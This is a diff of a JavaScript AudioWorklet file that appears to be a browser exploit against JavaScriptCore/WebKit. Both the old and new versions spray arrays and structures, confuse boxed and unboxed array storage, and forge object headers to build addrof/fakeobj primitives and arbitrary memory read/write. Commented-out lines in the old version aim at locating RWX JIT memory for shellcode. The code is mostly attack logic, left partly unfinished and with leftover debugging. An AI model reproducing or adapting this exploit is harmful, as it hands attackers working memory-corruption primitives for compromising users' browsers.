@@ -1,94 +1,10 @@
-//
-// Utility functions.
-//
-// Copyright (c) 2016 Samuel Groß
-//
+// constant added to double JSValues
+      //const socket = io.connect('/');
 
-// Display alert message
-function strcmp(b, str)
-{
-    var fn = typeof b == "function" ? b : function(i) { return b[i]; };
-    for(var i = 0; i < str.length; ++i)
-    {
-        if(fn(i) != str.charCodeAt(i))
-        {
-            
-            return false;
-        }
-    }
-    return fn(str.length) == 0;
-}
-
-function delay(ms = 1000){
-    var t1 = Date.now();
-    while(Date.now() - t1 <= ms){
-
-    }
-}
-// Return the hexadecimal representation of the given byte.
-function hex(b,c) {
-    if (c) {
-    if (b < 0)
-        return `-${hex(-b)}`
-    return `0x${b.toString(16)}`
-    } else {
-    return ('0' + b.toString(16)).substr(-2);
-    }
-}
-
-
-function hex1(x) {
+      function hex1(x) {
     if (x < 0)
         return `-${hex1(-x)}`;
     return `0x${x.toString(16)}`;
-}
-
-
-// Return the hexadecimal representation of the given byte array.
-function hexlify(bytes) {
-    var res = [];
-    for (var i = 0; i < bytes.length; i++)
-        res.push(hex(bytes[i]));
-
-    return res.join('');
-}
-
-// Return the binary data represented by the given hexdecimal string.
-function unhexlify(hexstr) {
-    if (hexstr.length % 2 == 1)
-        throw new TypeError("Invalid hex string");
-
-    var bytes = new Uint8Array(hexstr.length / 2);
-    for (var i = 0; i < hexstr.length; i += 2)
-        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);
-
-    return bytes;
-}
-
-function hexdump(data) {
-    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
-        data = Array.from(data);
-
-    var lines = [];
-    for (var i = 0; i < data.length; i += 16) {
-        var chunk = data.slice(i, i+16);
-        var parts = chunk.map(hex);
-        if (parts.length > 8)
-            parts.splice(8, 0, ' ');
-        lines.push(parts.join(' '));
-    }
-
-    return lines.join('\n');
-}
-
-function sleep( sleepDuration ){
-    var now = new Date().getTime();
-    while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
-}
-function gc() {
-    for (let i = 0; i < 0x10; i++) {
-            new ArrayBuffer(0x1000000);
-        }
 }
 let data_view = new DataView(new ArrayBuffer(8));
 var floatAsQword = float => { //f2i
@@ -106,254 +22,125 @@ var qwordAsFloat = qword => { //i2f
     //data_view.setBigUint64(0, qword);
     return data_view.getFloat64(0, true);
 }
-function change_container(header, arr){
-    try{}
-    catch{}
-    for(var i = 0; i < 0x100000; i++){
-        ds[i].cellHeader = header;
-        ds[i].butterfly = arr;
+      const kBoxedDoubleOffset = 0x0002000000000000n;
+
+      var array_spray = [];
+    for (var i = 0; i < 1000; ++i) {
+        array_spray[i] = [13.37+i, 13.37];
     }
-}
-const MY_OBJECT_OFFSET = 0x14fb0;
-//MakeJitCompiledFunction();
-//MakeJitCompiledFunction();
-
-
-var a= new Array(10);
-for(var i = 0; i < 0x1000; i++)
-	a[i]= Array(0x40).fill(0.0);
-var b = Array(0x40).fill(0.0);
-var c = Array(0x40).fill(0.0);
-var ds = new Array(0x100000);
-
-let noCoW =13.37
-let pad = new Array(noCoW, 2.2, {}, 13.37);
-let pad1 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
-let pad2 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
-
-var evil_arr = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
-
-var boxed = new Array(qwordAsTagged(0x41414141414141), noCoW, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
-//var boxed = new Array(qwordAsTagged(0x41414141414141),{},{},{},{},{})
-var unboxed = new Array(noCoW, 13.37, 13.37, 13.37, 5.5, 6.6, 7.7, 8,8);
-
-
-
-var victim = [noCoW, 14.47, 15.57];
-victim['prop'] = 13.37;
-victim['prop_1'] = 13.37;
-//victi
-let pad3 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
-
-//var gcPreventer = [];
-var structure_id = 0;
-c[0] = 1.1;
-var fuck = undefined;
-var fuck2 = undefined;
-var driver = undefined;
-var stage = "leak"
-var jscell_header = undefined;
-var evil_arr_butterfly = undefined;
-var expected_ptr = undefined;
-eval(`
-for(var i = 0; i < 0x10000; i++){
-    var tag = qwordAsTagged(0x0108230700001000)
-    ds[i] = {
-        cellHeader1: tag,
-        butterfly1: evil_arr,
-        cellHeader2: tag,
-        butterfly2: evil_arr,
-        cellHeader3: tag,
-        butterfly3: evil_arr
-    };
-}
-
-var structure_spray = []
+    var structure_spray = [];
 for (var i = 0; i < 1000; ++i) {
     var ary = [13.37];
     ary.prop = 13.37;
     ary['p'+i] = 13.37;
     structure_spray.push(ary);
 }
-var victim1 = structure_spray[0];
+    var unboxed1 = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37];
+    unboxed1[0] = 4.2; // no CopyOnWrite
+  //alert("hehe")
+      function boxDouble(d) {
+        return d + kBoxedDoubleOffset;
+      }
+      function unboxDouble(d) {
+        return d - kBoxedDoubleOffset;
+      }
+      // the structure ID is wrong, but we'll fix it :)
+      let doubleArrayCellHeader = 0x0108230700000000n;
+      let f = new Float64Array(1);
+      let u = new Uint32Array(f.buffer);
+      function float2bigint(v) {
+        f[0] = v;
+        return BigInt(u[0]) | (BigInt(u[1]) << 32n);
+      }
+      function bigint2float(v) {
+        u[0] = Number(v & 0xffffffffn);
+        u[1] = Number(v >> 32n);
+        return f[0];
+      }
+      // store things to prevent GC
+      let keep = [];
+      function gc(n=10000) {
+        let tmp = [];
+        for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
+      }
+      // message port to talk to main thread; will be set later
+      let port = null;
+      // will be implemented later
+      let fakeobj = null;
+      let addrof = null;
+      for (var i = 0; i < 100; i++) keep.push([1.1*i]);
+      let a0 = [0,0,0,0,0,0,0,0,0,0];
 
-`); //sprayed doubled array flags and butterfly is victim aka evil_arr
-function makeJITCompiledFunction() {
-    // Some code to avoid inlining...
-    function target(num) {
-        for (var i = 2; i < num; i++) {
-            if (num % i === 0) {
-                return false;
-            }
-        }
-        return true;
-    }
-
-    // Force JIT compilation.
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    return target;
-}
-var shellcodeFunc = makeJITCompiledFunction();
-
-b.process = (inputs, outputs, parameters)=>{
-   
-    /*var structure_spray = []
-    var i = 0;
-    var ary = [13.37];
-    ary.prop = 1234;
-    ary['p'+i] = 13.37;
-    structure_spray.push(ary);*/
-    //structure_spray.push(ary);
-    //structure_spray.push(ary);
-    //structure_spray.push(ary);
-
-    
-
-//var victim1 = structure_spray[1];
-    if(stage == "leak"){
-        var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
-        expected_ptr = Number(expected_ptr);
-        c[8] = qwordAsFloat(expected_ptr + 0x4010);
-        c[9] = qwordAsFloat(0x0);
-        stage  = "bypass_etc";
-        fuck.port.postMessage(c);
-        //sleep(4000);
-        return true;
-    }
-    else if(stage == "bypass_etc"){
-        //fuck.port.postMessage(typeof parameters);
-        var gcPreventer = [];
-        for (let i = 0; i < 2; i++) {
-            let a = i == 0 ? parameters : victim;
-            fuck.port.postMessage("1st" + a[0]);
-            gcPreventer.push(a[0]);
-        }
-        jscell_header = gcPreventer[0];
+      let a1 = [0,0,0,0,0,0,0,0,0,0];
+      // transition to unboxed double storage
+      a1[3] = 13.37;
+      let b0 = [0,0,0,0,0,0,0,0,0,0];
+      let b1 = [{},{},13.37]//[0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array
+      // put zeroes in first two slots so JSCallbackData destruction is safe
+      delete b1[0];
+      delete b1[1];
+      function setupPrimitives() {
         
-        var gcPreventer = [];
-        var e = [{},{}];
-        e.prop = 13.37
-        e['p'+1] = 13.37
-        for (let i = 0; i < 2; i++) {
-            let a = i == 0 ? parameters : victim;
-            fuck.port.postMessage("2nd" + a[1]);
-            gcPreventer.push(a[1]);
+        port.postMessage("setting up");
+        if (a1.length != 0x1337) {
+          port.postMessage("Failure on array length");
+          return;
         }
-        //fuck.port.postMessage()
 
-        evil_arr_butterfly = floatAsQword(gcPreventer[0]);
-        //var u = [{},{},13.37]
-        var gcPreventer = [];
-        for (let i = 0; i < 2; i++) {
-            let a = i == 0 ? parameters : e;
-            fuck.port.postMessage("3rd" + a[2]);
-            gcPreventer.push(a[2]);
+        //const kSentinel = 1333.337;
+        var kSentinel = qwordAsFloat(0x41414141414141)
+        let offset = -1;
+        b1[0] = kSentinel;
+        // scan for the sentinel to find the offset from a to b
+        for (var i = 0; i < 0x100; i++) {
+          if (qwordAsTagged(floatAsQword(a1[i])) == kSentinel) {
+            port.postMessage("a1[i]" + typeof a1 + hex1(floatAsQword(qwordAsTagged(floatAsQword(a1[i])))))
+            offset = i;
+            break;
+          }
         }
-        var contigousflags = gcPreventer[0];
-
-        //fuck
-        /*for (let i = 0; i < 2; i++) {
-            let a = i == 0 ? pad2 : victim;
-            fuck.port.postMessage(a[1]);
-            gcPreventer.push(a[1]);
-        }*/
-
-        
-        structure_id = floatAsQword(jscell_header) & 0xFFFFFFFF;
-        var contigousid = floatAsQword(contigousflags) & 0xFFFFFFFF;
-        if(structure_id == 0 ){
-            fuck.port.postMessage(`retry`);
-            
-            c[8] = qwordAsFloat(0);
-            parameters = null;
-            //sleep(10000000);
-            //stage = "leak";
-            return false;
+        if (offset == -1) {
+          port.postMessage("Failure finding offset");
+          return;
         }
-        fuck.port.postMessage("double struc id : " + hex(structure_id))
-        fuck.port.postMessage(`double array jscell header : ${hex1(floatAsQword(jscell_header)).toString(16)}`);
-        fuck.port.postMessage("contigous struc id : " + hex(contigousid))
-        fuck.port.postMessage("array contigous jscell_header" + hex1(floatAsQword(contigousflags)).toString(16))
-        fuck.port.postMessage(`evil_arr_butterfly : ${evil_arr_butterfly.toString(16)}`);
-        //return false;
-        var cellHeader = jscell_header//qwordAsTagged( (0x01082307 * 0x100000000) + structure_id);
-        //change_container(cellHeader, evil_arr);
-        c[8] = qwordAsFloat(evil_arr_butterfly);
-        evil_arr[0] = cellHeader;
-        evil_arr[1] = qwordAsFloat(evil_arr_butterfly-0x8);
-
-        stage = "r/w";
-        return true;
-    }
-    else if(stage == "r/w"){
-        for(var i =0; i < 2; i++){
-            let a = i == 0 ? parameters: pad;
-            a[0] = qwordAsFloat(0x133700001337);
+        //port.postMessage("here")
+        // temporary implementations
+        addrof = (val) => {
+          b1[0] = val;
+          return floatAsQword(a1[offset]);
         }
-        fuck.port.postMessage(`evil_arr length : ${(evil_arr.length).toString(16)}`);
-        evil_arr[0] = qwordAsFloat( (0x00010100 * 0x100000000) + structure_id);
-        evil_arr[1] = qwordAsFloat(0);
-        var boxed_offset = 0;
-        for(var i = 0; i < evil_arr.length; i++){
-            if(evil_arr[i] == qwordAsFloat(0x0041414141414140)){
-                fuck.port.postMessage(`boxed_arr length offset: ${(i)}`);
-                boxed_offset = i;
-                break;
-            }
+        fakeobj = (addr) => {
+          a1[offset] = qwordAsFloat(addr);
+          return b1[0];
         }
-        /*for (var i = 0; i < boxed.length; i++) {
-            boxed[i] = 13.37
-        }*/
-        //delete boxed[0];
-        //delete boxed[0];
-        //theoretically soeaking evil arr is unboxed and boxed is "JSValue or array contingous"
-        var addrof1 = (obj)=>{
-            boxed[0] = obj;
-            return floatAsQword(evil_arr[boxed_offset]); //get a raw double value represented as
-            //as float then convert that to qword
-            //boxed_offset is the shared butterfly sort to say of another exploit where they
-            //overlap
-        }
-        var fakeObj = (addr)=>{
-            evil_arr[boxed_offset] = qwordAsFloat(addr);
-            //return boxed[0]; //array contigous so pull object out
-            return boxed[0];
-        }
-        var outer = {
-        header: qwordAsFloat((0x00010800 * 0x100000000) + structure_id), //jscell_header+structure_id, // cell
-        butterfly: victim1, // butterfly
-        };
+        var victim1 = structure_spray[510];
+        // Gigacage bypass: Forge a JSObject which has its butterfly pointing
+        // to victim
         var boxed1 = [{}];
-        var unboxed1 = [`${'13.37,'.repeat(100)}`];
-        unboxed1[0] = 4.2; //no cow double array
-        var hax = fakeObj(addrof1(outer) + 0x10);
-        fuck.port.postMessage("we got hax arb r/w obj!!!");
-        hax[1] = unboxed1;
-        fuck.port.postMessage("shared bfly " + hex(floatAsQword(victim1[1])))
-        var shared = floatAsQword(victim1[1])
-        hax[1] = boxed1;
-        victim1[1] = qwordAsFloat(shared);
-        outer.header = jscell_header;
-        //boxed = null;
-        //unboxed = null;
-        //fuck.port.postMessage("cleared previous boxed and unboxed")
+        var print = (msg) => {
+          port.postMessage(msg);
+        }
+        print("unboxed @ " + hex1(addrof(unboxed1)));
+        print("boxed @ " + hex1(addrof(boxed1)));
 
-        //var origButterfly = hax[1];
+    var outer = {
+        header: qwordAsTagged(0x0108230900000000), // cell
+        butterfly: victim1, // butterfly
+    };
+    print("outer @ " + hex1(addrof(outer)));
 
-        //fuck.port.postMessage("here" + addrof1(new Uint8Array(8)))
-        //var orig = qwordAsFloat(hax[1])
-        //fuck.port.postMessage(orig);
-        var memory = {
+    var hax = fakeobj(addrof(outer) + 0x10);
+    hax[1] = unboxed1;
+    var shared_butterfly = floatAsQword(victim1[1]);
+    print("shared butterfly @ " + hex1(shared_butterfly));
+    hax[1] = boxed1;
+    victim1[1] = qwordAsFloat(shared_butterfly);
+
+    outer.header = qwordAsTagged(0x0108230700000000);
+
+    var stage2 = {
         addrof: function(victim) {
-            boxed1[0] = victim1;
+            boxed1[0] = victim;
             return floatAsQword(unboxed1[0]);
         },
 
@@ -362,177 +149,126 @@ b.process = (inputs, outputs, parameters)=>{
             return boxed1[0];
         },
 
-        // Write an int64 to the given address.
-        write64(addr, int64) {
-            hax[1] = qwordAsFloat(addr+0x10);
-            victim.prop = fakeObj(int64);
+        write64: function(where, what) {
+            hax[1] = qwordAsFloat(where + 0x10);
+            victim1.prop = this.fakeobj(qwordAsTagged(what));
         },
 
-        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
-        /*write16(addr, value) {
-            // Set butterfly of victim object and dereference.
-            hax[1] = qwordAsFloat(addr+0x10);
-            victim.prop = this.fakeobj(value);
-        },*/
-
-        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
-        write(addr, data) {
-            while (data.length % 4 != 0)
-                data.push(0);
-
-            var bytes = new Uint8Array(data);
-            var ints = new Uint16Array(bytes.buffer);
-
-            for (var i = 0; i < ints.length; i++)
-                this.write16(addr + (2 * i), ints[i]);
+        read64: function(where) {
+            hax[1] = qwordAsFloat(where + 0x10);
+            return this.addrof(victim1.prop);
         },
 
-        // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
-        read64(addr) {
-            // Set butterfly of victim object and dereference.
-            hax[1] = qwordAsFloat(addr+0x10);
-            //return victim.pointer;
-            return this.addrof(victim.prop);
-        },
-        read: function(addr, length) {
-            var a = new Array(length);
-            var i;
-
-            for (i = 0; i + 8 < length; i += 8) {
-                v = this.read64(addr + i).bytes()
-                for (var j = 0; j < 8; j++) {
-                    a[i+j] = v[j];
-                }
+        test: function() {
+            var addr = this.addrof({a: 0x1337});
+            var x = this.fakeobj(addr);
+            if (x.a != 0x1337) {
+                print('stage2 addrof/fakeobj does not work');
             }
 
-            v = this.read64(addr + i).bytes()
-            for (var j = i; j < length; j++) {
-                a[j] = v[j - i];
+            var val = 0x42424242;
+            this.write64(shared_butterfly + 8, 0x42424242);
+            print(hex1(floatAsQword(unboxed1[1])))
+            if (qwordAsFloat(val) != unboxed1[1]) {
+                print('stage2 write does not work');
             }
 
-            return a
+            if (this.read64(shared_butterfly + 8) != 0x42424242) {
+                print('stage2 read does not work');
+            }
         },
-        //fuck.port.postMessage(memory.read({a:0x4141414141},0x10))
-        /*// Verify that memory read and write primitives work.
-        test() {
-            var v = {};
-            var obj = {p: v};
 
-            var addr = this.addrof(obj);
-            fuck.port.postMessage("test addr" + hex(addr))
-            if(this.fakeObj(addr).p != v) {
-            fuck.port.postMessage("addrof and/or fakeobj does not work");
-            }
+        clear: function() {
+            outer = null;
+            hax = null;
+            for (var i = 0; i < unboxed_size; ++i)
+                boxed1[i] = null;
+            boxed1 = null
+            unboxed1 = null
+        },
+    };
 
-            var propertyAddr = addr+0x10;
+    stage2.test();
 
-            var value = this.read64(propertyAddr);
-            fuck.port.postMessage(value + "vs" + addrof(v))
-            //assert(qwordAsFloat(value) == qwordAsFloat(addrof(v)), "read64 does not work");
-        },*/
-    }
 
-        memory.write64(0x414141414141,0x5151515151515151515);
-        //memory.test();
-        
-        //var shared_butterfly = floatAsQword(e[1]);
-        //memory.adr
-        //fuck.port.postMessage(hex(memory.fakeobj(memory.addrof({a:0x4141414141})).a))
-        fuck.port.postMessage("we full stable arb r/w !!!");
-        //let z = new ArrayBuffer(1000) = memory;
-        //fuck.port.postMessage(z)
+        /*var addr1 = addrof({a:0x1337});
+        var fb = fakeobj(addr1)
 
-        
-        
-        //var shellcodeFuncAddr = hex1(memory.addrof(shellcodeFunc));
-        //fuck.port.postMessage("[+] Shellcode function @ " + shellcodeFuncAddr >> 5);
-        
-        //var executableAddr = memory.read64(shellcodeFuncAddr+24); //3*8
-        //fuck.port.postMessage("[+] Executable instance @ " + hex1(executableAddr));
-        
-        //var jitCodeAddr = memory.read64(executableAddr + (3*8)); //3*8
-        //fuck.port.postMessage("[+] JITCode instance @ " + hex(jitCodeAddr));
-        
-        //var rwxMemAddr = memory.read64(jitCodeAddr + (4*8)); //4*8
-        //rwxMemAddr = rwxMemAddr;
-        //printFunc("[+] " + (rwx === true ? "RWX" : "RX") + " memory @ " + rwxMemAddr);
-        stage="gc_test"
-        return true;
-    }
-    else if(stage=="gc_test"){
-        gc();
-        fuck.port.postMessage("Garbage Collected");
-        //sleep(100000);
-        return false;
-    }
-    //  sleep(2000);
-    return true;
-}
-/*class OrigineWorklet extends AudioWorkletProcessor {
-    constructor(){
-        super();
-        this.port.onmessage = (e) => {
-
+        port.postMessage("addrof {}" + hex1(fb.a))
+        var obj = {
+          jsCellHeader: qwordAsTagged(0x0108230700000000),
+          fakeButterfly: a0
+        };
+        port.postMessage("here debug");
+        let addr = addrof(obj);
+        port.postMessage("Found obj @ " + hex1(addr));
+        //port.postMessage("obj @ " + addr.toString(16));
+        let fakeArr = fakeobj(addr + 0x10);
+        // subtract off the incref
+        doubleArrayCellHeader = floatAsQword(fakeArr[0]) - 0x1;
+        port.postMessage("double array header @ " + hex1(doubleArrayCellHeader));
+        //port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
+        // fix broken cell header
+        var doublebfly = floatAsQword(fakeArr[1])
+        port.postMessage("double array butterfly @ " + hex1(doublebfly));
+        fakeArr[0] = qwordAsFloat(doubleArrayCellHeader);
+        port.postMessage("debug1")
+        // grab a real butterfly pointer
+        let doubleArrayButterfly = floatAsQword(fakeArr[1]);
+        port.postMessage("debug2")
+        // fix other broken cell header
+        obj.fakeButterfly = b0;
+        port.postMessage("debug3")
+        fakeArr[0] = qwordAsFloat(doubleArrayCellHeader);
+        port.postMessage("debug4")
+        // fix the broken butterflys and setup cleaner addrof / fakeobj
+        obj.jsCellHeader = qwordAsTagged(doubleArrayCellHeader);
+        port.postMessage("debug4")
+        //here
+        obj.fakeButterfly = a1;
+        port.postMessage("debug5")
+        //port.postMessage(hex1(qwordAsTagged(doublebfly)))
+        fakeArr[1] = qwordAsFloat(doublebfly);
+        port.postMessage("debug6")
+        obj.fakeButterfly = b1;
+        port.postMessage("debug7")
+        fakeArr[1] = qwordAsFloat(doublebfly);
+        fakeobj = (addr) => {
+          a1[offset] = qwordAsFloat(addr);
+          return b1[0];
         }
-        //var fuck2 = new AudioWorkletProcessor();
-        return b;
-    }
-    static get parameterDescriptors() {
-        return []
-    }
-    process (inputs, outputs, parameters) {
-        
-        return false;
-    }
-}*/
-//var z = [];
-
-class OrigineWorklet2 extends AudioWorkletProcessor {
-    constructor(){
-        super();
-        //console.log(c);
-        this.port.onmessage = (e)=>{
-            if(e.data == Object) {
-                port.postMessage("successfully transported div element as obj")
-            }
+        addrof = (val) => {
+          b1[offset] = val;
+          return floatAsQword(a1[0]);
+        }*/
+      }
+      function pwn() {
+        try {
+          setupPrimitives();
+          // ensure we can survive GC
+          //gc();
+          // TODO: rest of exploit goes here
+          port.postMessage("done!");
+        } catch(e) { // send exception strings to main thread (for debugging)
+          port.postMessage("Exception!!");
+          port.postMessage(e.toString());
         }
-        
-        fuck = this;
-        //fuck.port.postMessage(c);
-        return this;
-    }
-    static get parameterDescriptors() {
-        return [{
-            name: 'param2',
-            defaultValue: 0.1337
-        }];
-    }
-    process (inputs, outputs, parameters) {
-        //
-        //
-        //this.port.postMessage(c);
-        return false;
-    }
-}
-
-class OrigineWorklet extends AudioWorkletProcessor {
-    constructor(){
-        super();
-        this.port.onmessage = (e) => {
-            fuck.port.postMessage("got message in Worklet1" + typeof e.data)
-
+      }
+      registerProcessor("a", class {
+        constructor() {
+          // setup a message port to the main thread
+          port = new AudioWorkletProcessor().port;
+          port.onmessage = pwn;
+          // this part is magic
+          // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
+          eval('1 + 0x1336');
+          // overwrite a1's butterfly with a fastMalloc pointer
+          return {fill: 1, a: a0};
         }
-        //var fuck2 = new AudioWorkletProcessor();
-        return b;
-    }
-    static get parameterDescriptors() {
-        return []
-    }
-    process (inputs, outputs, parameters) {
-        
-        return false;
-    }
-}
-
-registerProcessor('OrigineWorklet', OrigineWorklet);
-registerProcessor('OrigineWorklet2', OrigineWorklet2);
+      });
+      registerProcessor("b", class {
+        constructor() {
+          // overwrite b1's butterfly with a fastMalloc pointer
+          return {fill: 1, b: b0};
+        }
+      });
